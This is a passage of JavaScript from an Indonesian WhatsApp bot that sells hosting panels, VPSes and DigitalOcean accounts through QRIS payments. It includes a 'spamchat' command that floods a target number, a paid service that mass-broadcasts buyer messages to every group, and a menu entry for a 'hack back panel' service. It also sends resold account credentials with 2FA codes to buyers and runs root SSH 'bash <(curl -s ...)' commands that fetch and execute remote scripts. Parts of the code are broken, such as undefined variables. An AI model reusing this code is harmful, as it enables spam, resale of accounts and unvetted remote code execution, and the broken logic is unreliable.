const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Digitalocean ${Obj.akun.droplet} Droplet
`}, {quoted: db.users[m.sender].saweria.msg})
var teks = `*Data Akun Digitalocean 📦*

*💌 Email :* ${Obj.akun.email}
*🔐 Password :* ${Obj.akun.password}
*Kode 2FA :* ${Obj.akun.kode2fa}
*Droplet :* ${Obj.akun.droplet}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Seller hanya mengirim 1 kali!
* Garansi akun aktif 48 jam
`
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: m})
const position = stokdo.indexOf(Obj.akun)
stokdo.splice(position, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
 break

case "shopmenu": {
let teks = `
silahkan pilih fitur Shop Menu Yang ada Di bawah ini
`
await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Beli Produk',
 sections: [
 {
 title: 'List Produk',
 highlight_label: 'Recommended',
 rows: [
 {
 title: 'Panel Pterodactyl',
 id: '.buypanel'
 },
 {
 title: 'Admin Panel Pterodactyl',
 id: '.buyadp'
 }, 
 {
 title: 'Owner Panel Pterodactyl ',
 id: '.buyownpanel'
 }, 
 {
 title: 'PT Panel Pterodactyl',
 id: '.buyptpanel'
 }, 
 {
 title: 'Vps (Virtual Private Server)',
 id: '.buyvps'
 },
 {
 title: 'Script Bot WhatsApp',
 id: '.buysc'
 }, 
 {
 title: 'Digitalocean',
 id: '.buydo'
 }, 
 {
 title: 'Stok All',
 id: '.buystok'
 }, 
 {
 title: 'Jasa Jpm Pesan',
 id: '.buyjasajpm'
 },
 {
 title: 'Install Panel',
 id: '.buyjasainstallpanel'
 }, 
 {
 title: 'Jasa Install Tema',
 id: '.jasainstalltema'
 }, 
 {
 title: 'Jasa Hack Back Panel',
 id: '.jasahbpanel'
 } 
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 document: fs.readFileSync("./package.json"),
 fileName: `By ${namaOwner} </>`,
 mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
 fileLength: 99999999,
 caption: teks,
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idSaluran,
 newsletterName: global.namaSaluran
 }, 
 externalAdReply: {
 title: `${botname} - ${versi}`,
 thumbnailUrl: global.image.menu,
 sourceUrl: linkWebsite,
 mediaType: 1,
 renderLargerThumbnail: true,
 },
 },
})
}
break

case "addserver": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example(`domain(contoh skyzo.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
if (!text.split("|")) return m.reply(example(`domain(contoh skyzo.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
let dt = text.split('|')
if (dt.length < 6) return m.reply(example(`domain(contoh skyzo.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
let [dom, eg, nest, locc, ptla, ptlc] = dt
const natalia = {
"domain": `https://${dom}`, 
"egg": eg, 
"nestid": nest, 
"loc": loc, 
"apikey": ptla, 
"capikey": ptlc
}
serverpanel.push(natalia)
await fs.writeFileSync("./library/database/settingpanel.json", JSON.stringify(serverpanel, null, 2))
m.reply(`Berhasil menambah server panel *${dom}*`)
}
break

case "delserver": case "delserverpanel": {
  if (!isCreator) return Reply(mess.owner)
  if (serverpanel.length < 1) return m.reply("❌ Tidak ada server di database")

  // Membuat list button
  const sections = [
    {
      title: "List Server Panel",
      rows: serverpanel.map((srv, index) => ({
        title: srv.domain,
        description: `Klik untuk menghapus server ini dari database`,
        rowId: `.delsrvconfirm ${index}`
      }))
    }
  ]

  const listMessage = {
    text: `Pilih server yang ingin dihapus:`,
    footer: "®FR3 DEV",
    buttonText: "Pilih Server",
    sections
  }

  Nvidia.sendMessage(m.chat, listMessage, { quoted: m })
}
break

case "delsrvconfirm": {
  if (!isCreator) return Reply(mess.owner)
  if (!text) return m.reply("❌ Mohon masukkan index server yang valid")

  const index = parseInt(text)
  if (isNaN(index) || index < 0 || index >= serverpanel.length) return m.reply("❌ Index server tidak valid!")

  const hapus = serverpanel[index]
  serverpanel.splice(index, 1)
  await fs.writeFileSync("./", JSON.stringify(serverpanel, null, 2))
  m.reply(`✅ Berhasil menghapus server *${hapus.domain}*`)
}
break

case "ml": case "mlstalk": {
  if (!text) return m.reply('Contoh: .stalkml 12345678|1234')

  const axios = require('axios')
  const apikey = 'zenzkey' // Ganti dengan apikey milikmu
  const [uid, server] = text.split('|').map(v => v.trim())

  if (!uid || !server) return m.reply('Format salah. Contoh: .stalkml 12345678|1234')

  try {
    const { data } = await axios.get(`https://api.zahwazein.xyz/stalker/mobile-legends/${uid}/${server}?apikey=${apikey}`)
    const res = data.result

    const teks = `🎮 *Mobile Legends Info*\n\n` +
      `• Nickname : ${res.nickname}\n` +
      `• ID       : ${res.id} (${res.server})\n` +
      `• Level    : ${res.level}`

    m.reply(teks)
  } catch (err) {
    console.error(err)
    m.reply('❌ Gagal mengambil data ML. Periksa ID dan server kamu.')
  }

  return
}
break

case "epep":
case "ff":
case "ffstalk":{
  if (!text) return m.reply('Contoh: .ffstalk 123456789')

  const axios = require('axios')
  const apikey = 'zenzkey' // Ganti dengan API key kamu

  try {
    const { data } = await axios.get(`https://api.zahwazein.xyz/stalker/freefire/${text}?apikey=${apikey}`)
    const res = data.result

    const teks = `🎮 *Free Fire Stalk*\n\n` +
      `• Nickname : ${res.nickname}\n` +
      `• ID       : ${res.id}\n` +
      `• Level    : ${res.level}\n` +
      `• Region   : ${res.region}`

    m.reply(teks)
  } catch (e) {
    console.error(e)
    m.reply('❌ Gagal mengambil data. Cek ID-nya atau coba lagi nanti.')
  }

  return
}
break

case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|😍'))
let [e1, e2] = text.split("|")
let brat = `https://restapi-v2.simplebot.my.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await Nvidia.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break

case "buyjasajpm": case "jasajpm": {
if (m.isGroup) return m.reply("Pembelian jasa jpm hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
const tgc = await Nvidia.groupFetchAllParticipating()
let totalgrup = await Object.keys(tgc)
if (!text) return m.reply(example(`text bisa dengan kirim foto juga\n\n*Total Grup :* ${totalgrup.length} Grup chat\n*Harga :* Rp10.000`))
let Obj = {}
Obj.harga = "10000"
Obj.pesan = text
if (/image/.test(mime)) Obj.img = qmsg
const UrlQr = global.qrisOrderKuota

const amount = Number(Obj.harga) + generateRandomNumber(110, 250)
 const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);

 const teks3 = `
 🛒 *INFORMASI PEMBAYARAN*

 *?? ID Transaksi :* ${get.data.result.transactionId}
 *💰 Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *📦 Barang :* Jasa JPM Grub
 *⏳ Pembayaran Expired :* 5 menit

 ⚠️ *Perhatian*: QRIS hanya berlaku dalam 5 menit. Jangan lewatkan kesempatan ini!`
let msgQr = await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: `.batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: get.data.result.transactionId,
 amount: get.data.result.amount.toString(),
 exp: function () {
 setTimeout(async () => {
 if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 await clearInterval(db.users[m.sender].saweria.exp);
 delete db.users[m.sender].saweria;
 }
 }, 300000); // 5 menit
 }
 };

 await db.users[m.sender].saweria.exp();

 while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
 await sleep(8000);
 const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
 const req = await resultcek.data;

 if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
 db.users[m.sender].status_deposit = false;
 await clearInterval(db.users[m.sender].saweria.exp);
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: `
 ✅ *PEMBAYARAN BERHASIL!*

 *💳 ID Transaksi :* ${db.users[m.sender].saweria.idDeposit}
 *💰 Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *📦 Barang :* Jasa JPM Grub

 🎉 *Selamat, Pembelian kamu berhasil diproses!*
 `}, {quoted: db.users[m.sender].saweria.msg});

let rest
if (Obj.img !== undefined) {
rest = await Nvidia.downloadAndSaveMediaMessage(Obj.img)
}
const allgrup = await Nvidia.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = Obj.pesan
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await m.reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Nvidia.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await Nvidia.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${res.length} grup chat`}, {quoted: m})
await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
};
break

case "readqr": {
if (!/image/.test(mime)) return example("dengan reply qris")
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
            };
            qr.decode(image.bitmap);
        } catch (error) {
            return m.reply("error : " + error)
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
await Nvidia.sendMessage(m.chat, {text: `${dd}`}, {quoted: m})
}
break;

case "reactionch": case "reactch": {
 if (!isCreator) return m.reply('Khusus Owner');
 if (!text) return m.reply("Contoh: .reactch https://whatsapp.com/channel/invite/kode/channelid pesan");

 const [link, ...messageParts] = text.split(" ");
 const messageText = messageParts.join(" ");

 if (!link || !messageText) return m.reply("Format salah. Gunakan: .reactch <link> <pesan>");
 if (!link.includes("https://whatsapp.com/channel/")) return m.reply("Link channel tidak valid!");

 let inviteCode = link.split('/')[4];
 let serverId = link.split('/')[5];

 const charMap = {
 a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖', h: '🅗', i: '🅘', j: '🅙',
 k: '🅚', l: '🅛', m: '🅜', n: '🅝', o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣',
 u: '🅤', v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
 1: '➊', 2: '➋', 3: '➌', 4: '➍', 5: '➎', 6: '➏', 7: '➐', 8: '➑', 9: '➒', 0: '⓿',
 ' ': '▫️'
 };

 const converted = messageText
 .toLowerCase()
 .split('')
 .map(char => charMap[char] || '')
 .join('');

 if (!converted) return m.reply("Pesan hanya boleh berisi huruf, angka, dan spasi");

 try {
 let res = await Nvidia.newsletterMetadata("invite", inviteCode);
 await Nvidia.newsletterReactMessage(res.id, serverId, converted);
 m.reply(`Berhasil mengirim reaction:\n${converted}\nke channel *${res.name}*`);
 } catch (e) {
 console.log(e);
 m.reply("Gagal mengirim reaction. Pastikan link dan pesan valid.");
 }
}
break

case "cadmin-buyyer": {
if (!isCreator) return Reply(mess.owner)
if (serverpanel.length < 1) return m.reply("Tidak ada server panel")
if (!text) return m.reply(example("fr3,6283XXX"))
if (!args[1]) {
let list = []
let input
let cc = text.split(",")
if (cc.length > 1) {
input = text.split(",")[0] + "," 
input += m.mentionedJid[0] ? m.mentionedJid[0] : text.split(",")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
} else {
input = text
}
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1} ${input}`
})
}
return Nvidia.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Server',
 sections: [
 {
 title: `List All Server`,
 rows: [...list] 
 }
 ]
 })
 }
 }
 ],
 footer: `© WhatsApp Bots - 2025`,
 headerType: 1,
 viewOnce: true,
 text: "Pilih Salah Satu Server\n",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}

if (Number(args[0]) > serverpanel.length) return m.reply("Server panel tidak ditemukan")
let nomor
let usernem
let tek = args[1].split(",")
if (tek.length > 1) {
let [users, nom] = args[1].split(",")
if (!users || !nom) return m.reply(example("server username,nomor\n\nuntuk melihat server ketik *.listserver*\n\ncontoh *.cadmin* 2 fr3,6283XXX"))
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
usernem = users.toLowerCase()
} else {
usernem = args[1].toLowerCase()
nomor = m.chat
}

var onWa = await Nvidia.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di whatsapp!")
indx = Number(args[0] - 1)
let egg = serverpanel[indx].egg
let nestid = serverpanel[indx].nestid
let loc = serverpanel[indx].loc
let domain = serverpanel[indx].domain
let apikey = serverpanel[indx].apikey
let capikey = serverpanel[indx].capikey
let username = usernem
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.chat !== nomor) {
orang = nomor
await m.reply(`Akun admin panel *${capital(username)}* berhasil dibuat! data username dan password sudah dikirim ke nomor ${nomor.split("@")[0]}`)
} else {
orang = m.chat
}
var teks = `*Data Akun Admin Panel 📦*

*📡 ID (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ Created :* ${user.created_at.split("T")[0]}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await Nvidia.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break;

case "mutasi": {
if (!isOwner) return m.reply(mess.owner);
try {
const url = `https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`;
const response = await axios.get(url);

const transaksi = response.data || {};
if (transaksi.date) {
const tanggal = transaksi.date || "Tidak tersedia";
const nominal = transaksi.amount || "Tidak tersedia";
const jenis = transaksi.type || "Tidak tersedia";
const qris = transaksi.qris || "Tidak tersedia";
const namaBrand = transaksi.brand_name || "Tidak tersedia";
const issuerRef = transaksi.issuer_reff || "Tidak tersedia";
const buyerRef = transaksi.buyer_reff || "Tidak tersedia";
const saldo = transaksi.balance || "Tidak tersedia";

const caption = `
*▧ MUTASI TRANSAKSI*

 *• Tanggal :* ${tanggal}
 *• Nominal :* ${nominal}
 *• Jenis :* ${jenis}
 *• QRIS :* ${qris}
 *• Nama Brand :* ${namaBrand}
 *• Issue Reff :* ${issuerRef}
 *• Buyer Reff :* ${buyerRef}
 *• Balance :* ${saldo}
 
Berikut ini adalah hasil dari transaksi terakhir.`

m.reply2(caption);
} else {
console.error("Response tidak valid:", transaksi);
m.reply("Gagal mendapatkan informasi transaksi. Coba lagi nanti.");
}
} catch (error) {
console.error("Error saat mengecek mutasi transaksi:", error.message);
m.reply("Terjadi kesalahan saat mengecek mutasi transaksi. Silakan coba lagi.");
}
}
break

case "removebg": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
async function dt (buffer) {
 const fetchModule = await import('node-fetch');
 const fetch = fetchModule.default
 let { ext } = await fromBuffer(buffer);
 let bodyForm = new FormData();
 bodyForm.append("fileToUpload", buffer, "file." + ext);
 bodyForm.append("reqtype", "fileupload");
 let res = await fetch("https://catbox.moe/user/api.php", {
 method: "POST",
 body: bodyForm,
 });
 let data = await res.text();
 return data;
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await dt(aa)
const resnya = await fetchJson(`https://restapi-v2.simplebot.my.id/imagecreator/removebg?url=${dd}`)
await Nvidia.sendMessage(m.chat, {image: await getBuffer(resnya.result), caption: "Remove Background Done ✅"}, {quoted: m})
}
break

case "spamchat": {
 if (!isOwner) return Reply(mess.owner);
 if (!q) return m.reply(`❌ Format salah!\n\nContoh:\n.spamchat text <jumlah spam>\n.spamchat 6281234567890 text <jumlah spam>`);

 const args = q.split(' ');
 let target = m.chat; // Default ke chat aktif
 let message = '';
 let count = 1;

 // Jika argumen pertama adalah nomor telepon
 if (/^\d+$/.test(args[0])) {
 target = `${args[0]}@s.whatsapp.net`; // Format nomor ke JID
 args.shift(); // Hapus nomor dari argumen
 }

 // Ambil teks dan jumlah spam
 const textIndex = args.findIndex(arg => isNaN(arg)); // Index teks pertama
 if (textIndex === -1) return m.reply(`❌ Jumlah spam harus ditentukan di akhir.`);
 count = parseInt(args.pop()); // Jumlah spam
 message = args.join(' '); // Gabungkan teks

 if (count <= 0 || count > 100) return m.reply(`❌ Jumlah spam harus antara 1-100.`);

 // Konfirmasi spam
 m.reply(`📤 Mengirim ${count} pesan ke ${target.includes('@s.whatsapp.net') ? `nomor ${args[0]}` : `chat ini`}...\n\nTeks:\n${message}`);

 for (let i = 0; i < count; i++) {
 await Nvidia.sendMessage(target, { text: message });
 await sleep(1000); // Jeda 1 detik per pesan
 }

 m.reply(`✅ Spam selesai, ${count} pesan telah dikirim.`);
}
break;

case "jasainstalltemanebula": {
    if (!m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
    if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    const UrlQr = global.qrisOrderKuota;

    function generateRandomNumber(min, max) {
        return Math.floor(Math.random() * (max - min + 1)) + min;
    }

    let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
    const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);
    const teksPembayaran = `
    *▧ INFORMASI PEMBAYARAN*

    *• ID :* ${get.data.result.transactionId}
    *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
    *• Barang :* Tema Nebula Pterodactyl
    *• Expired :* 5 menit

    *Note :*
    QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
    `;

let msgQr = await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: `.batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: get.data.result.transactionId,
 amount: get.data.result.amount.toString(),
 exp: function () {
 setTimeout(async () => {
 if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 await clearInterval(db.users[m.sender].saweria.exp);
 delete db.users[m.sender].saweria;
 }
 }, 300000); // 5 menit
 }
 };

    await db.users[m.sender].saweria.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].saweria.amount) {
            db.users[m.sender].status_deposit = false;

            const connSettings = {
                host: global.installtema.vps,
                port: '22',
                username: 'root',
                password: global.installtema.pwvps,
            };

            const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
            const ress = new Client();

            ress.on('ready', async () => {
                Reply("Memproses install *tema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
                ress.exec(command, (err, stream) => {
                    if (err) throw err;
                    stream.on('close', async (code, signal) => { 
                        await Reply("Berhasil install *tema Nebula* pterodactyl ✅");
                        ress.end();
                    }).on('data', async (data) => {
                        console.log(data.toString());
                        stream.write('2\n'); // Input sesuai kebutuhan instalasi tema Nebula
                        stream.write('\n');
                        stream.write('\n');
                    }).stderr.on('data', (data) => {
                        console.log('STDERR: ' + data);
                    });
                });
            }).on('error', (err) => {
                console.log('connection Error: ' + err);
                Reply('Kata sandi atau IP VPS tidak valid.');
            }).connect(connSettings);

            await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
            delete db.users[m.sender].saweria;
        }
    }
}
break;


case "jasainstalldepend": {
  if (!m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const UrlQr = global.qrisOrderKuota;

  function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  let amount = 0 + generateRandomNumber(0, 2); // Harga tema ditambah angka unik
  const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);
  const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Depend Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
`;
let msgQr = await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: `.batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: get.data.result.transactionId,
 amount: get.data.result.amount.toString(),
 exp: function () {
 setTimeout(async () => {
 if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key });
 db.users[m.sender].status_deposit = false;
 await clearInterval(db.users[m.sender].saweria.exp);
 delete db.users[m.sender].saweria;
 }
 }, 300000); // 5 menit
 }
 };

  await db.users[m.sender].saweria.exp();

  while (db.users[m.sender].status_deposit) {
    await sleep(8000);
    const resultcek = await axios.get(`https://rafaelxd.tech/api/orkut/cekstatus?apikey=rafael&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
    const req = await resultcek.data.amount;
    if (req == db.users[m.sender].saweria.amount) {
      db.users[m.sender].status_deposit = false;

      const connSettings = {
        host: global.installtema.vps,
        port: '22',
        username: 'root',
        password: global.installtema.pwvps,
      };

      const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`;
      const ress = new Client();

      ress.on('ready', () => {
        Reply("Memproses instalasi tema enigma pterodactyl\nTunggu 1-10 menit hingga proses selesai.");
        ress.exec(command, (err, stream) => {
          if (err) throw err;
          stream.on('close', async (code, signal) => {
            await Reply("Berhasil install depend. Silakan lanjutkan dengan mengetik *.installnebula* ✅");
            ress.end();
          }).on('data', async (data) => {
            console.log(data.toString());
            stream.write('11\n');
            stream.write('A\n');
            stream.write('Y\n');
            stream.write('Y\n');
          }).stderr.on('data', (data) => {
            console.log('STDERR: ' + data);
          });
        });
      }).on('error', (err) => {
        console.log('connection Error: ' + err);
        Reply('Kata sandi atau IP VPS tidak valid.');
      }).connect(connSettings);

      await Nvidia.sendMessage(db.users[m.sender].saweria.chat, { text: "Pembayaran berhasil! Memulai instalasi tema..." }, { quoted: db.users[m.sender].saweria.msg });
      delete db.users[m.sender].saweria;
    }
  }
}
break;


case "jasainstalltemaenigma": {
  if (!m.isGroup) return Reply("Instalasi tema hanya dapat dilakukan melalui private chat.");
  if (db.users[m.sender].status_deposit) return Reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

  const UrlQr = global.qrisOrderKuota;

  function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }

  let amount = 5000 + generateRandomNumber(110, 250); // Harga tema ditambah angka unik
  const get = await axios.get(`https://rafaelxd.tech/api/orkut/createpayment?apikey=rafael&amount=${amount}&codeqr=${UrlQr}}`);
  const teksPembayaran = `
*▧ INFORMASI PEMBAYARAN*

*• ID :* ${get.data.result.transactionId}
*• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
*• Barang :* Tema Enigma Pterodactyl
*• Expired :* 5 menit

*Note :*
QRIS pembayaran hanya berlaku dalam 5 menit. Jika pembayaran berhasil, bot akan otomatis melanjutkan instalasi tema.
`;

let msgQr = await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: `.batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
 db.users[m.sender].status_deposit = true;
 db.users[m.sender].saweria = {
 msg: msgQr,
 chat: m.sender,
 idDeposit: get.data.result.transactionId,
 amount: get.data.result.amount.toString(),
 exp: function () {
 setTimeout(async () => {
 if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
 await Nvidia.sendMessage(db.users[m.sender].saweria.chat, {text: "⚠️ Waktu pembayaran telah expired, transaksi dibatalkan!"}, {quoted: db.users[m.sender].saweria.msg});
